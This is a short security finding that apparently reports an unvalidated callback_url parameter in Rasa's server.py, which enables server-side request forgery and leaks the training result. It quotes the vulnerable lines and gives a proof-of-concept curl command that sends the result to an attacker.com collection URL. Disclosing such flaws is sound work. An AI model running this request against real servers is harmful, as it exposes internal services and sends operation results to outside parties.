# callback_url SSRF + response exfiltration

**Verification: CODE-VERIFIED**

## Description
`rasa/server.py:548`:
```python
callback_url = request.args.get("callback_url")
```
`server.py:579`:
```python
async with aiohttp.ClientSession() as session:
    await session.post(callback_url, json=payload)
```
No URL validation (no urlparse/whitelist/scheme check/private IP filter). The result/error payload is POSTed to the attacker-specified URL.

## Impact
API caller (unauthenticated when token/JWT not configured — the default) triggers server-side POST to arbitrary internal or external URLs, with the response content of the original operation exfiltrated to the callback target.

## PoC
```bash
curl "http://<host>:5005/api/model/train?callback_url=http://attacker.com/collect" \
  -X POST -H "Content-Type: application/json" \
  -d '{"config": "...", "nlu": "..."}'
# Result payload POSTed to attacker.com/collect
```

## Execution result
```
Code path analysis: server.py:548 reads callback_url from query param
with no validation; server.py:579 aiohttp POST to that URL.
```
